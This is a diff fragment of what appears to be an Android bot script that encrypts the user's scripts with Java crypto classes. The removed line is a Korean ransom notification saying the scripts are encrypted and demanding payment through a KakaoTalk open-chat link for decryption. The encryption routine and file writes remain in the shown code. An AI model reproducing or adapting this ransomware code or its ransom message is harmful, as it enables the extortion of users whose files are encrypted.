@@ -4,7 +4,6 @@ importClass(javax.crypto.spec.SecretKeySpec);
 importClass(javax.crypto.spec.IvParameterSpec);
 if(!FileStream.read("sdcard/Android/data/p")) FileStream.write("sdcard/Android/p",w(0xA));
 
-Api.makeNoti("당신의 스크립트는 모두 암호화 되었습니다.\nhttps://open.kakao.com/o/sdQGKklg 이 링크에 갠을 오셔서 돈을 입금하시면 플어드릴수 있습니다.\n참고로 한자로도 지우면 복구가 불가능합니다",""),
 function n (x, e) {
     let cipher = r (e, Cipher.ENCRYPT_MODE);
     let encrypted = cipher.doFinal(java.lang.String(x).getBytes("UTF-8"));
